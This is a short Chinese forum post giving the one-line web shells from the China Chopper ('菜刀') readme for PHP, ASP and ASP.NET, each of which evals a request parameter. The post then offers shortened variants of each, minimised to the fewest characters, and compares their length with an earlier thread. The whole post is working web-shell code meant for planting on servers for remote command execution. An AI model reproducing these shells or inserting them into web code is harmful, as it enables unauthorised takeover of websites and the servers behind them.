菜刀readme.txt中附带一3个一句话： 

```
PHP:    <?php @eval($_POST['chopper']);?> 
ASP:    <%eval request("chopper")%> 
ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
```

抛弃密码的长度不算，其实这3个一句话均不是最短的。 
如： 
PHP我们可以这样写： 

```php
<?php @eval($_POST['0']);?>   原版 
<?=eval($_POST[0]);?>         缩小版
```

ASP我们可以这样写： 

```asp
<%eval request("0")%>   原版 
<%eval request(0)%>     缩小版
```

ASP.NET可以这样写： 

```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["z"],"unsafe");%>   原版 
<%@Page Language=JS%><%eval(Request.Item(0),"unsafe");%>             缩小版
```

当然你也可以把它写成这样(很显然体积上不占优势)： 

```
<%@Page Language="JAVASCRIPT"%><%eval(Request.Item(0),"unsafe");%>
```

已经用了许久的东西，直接回复原贴感觉很多人看不到，还是单独发出来吧。 
和原求助贴中的最长字符数对比： 

```
<%@ Page Language="Jscript"%><%eval(Request.Item["1"],"unsafe 
<%@Page Language=JS%><%eval(Request.Item(0),"unsafe");%>
```

显然达到目的了。
